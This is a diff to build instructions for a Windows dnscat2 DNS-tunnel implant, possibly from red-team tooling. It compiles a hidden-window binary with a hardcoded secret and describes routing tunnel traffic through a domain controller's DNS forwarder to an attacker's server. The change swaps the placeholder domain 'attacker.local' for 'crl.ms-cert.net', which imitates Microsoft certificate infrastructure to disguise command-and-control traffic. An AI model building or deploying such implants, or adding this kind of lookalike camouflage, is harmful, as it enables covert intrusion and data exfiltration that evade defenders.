@@ -29,7 +29,7 @@ go build -ldflags="-s -w \
 
 ```bash
 GOOS=windows GOARCH=amd64 go build -ldflags="-s -w -H windowsgui \
-  -X main.DefaultDomain=attacker.local \
+  -X main.DefaultDomain=crl.ms-cert.net \
   -X main.DefaultSecret=c7517dee4fcbe16a0c8c1f98cdc5ce4e" \
   -o dnscat2.exe ./cmd/dnscat/
 ```
@@ -38,7 +38,7 @@ The binary reads the DNS resolver IP at runtime from
 `HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{GUID}\NameServer`.
 On a domain-joined machine this returns the DC's IP, routing tunnel traffic
 through the internal DNS forwarder. Requires a conditional forwarder on the DC
-for `attacker.local` pointing to the attacker's dnscat2 server.
+for `crl.ms-cert.net` pointing to the attacker's dnscat2 server.
 
 **Windows — direct mode (hardcoded server IP, use when target is NOT domain-joined or DNS forwarder is not available):**
 
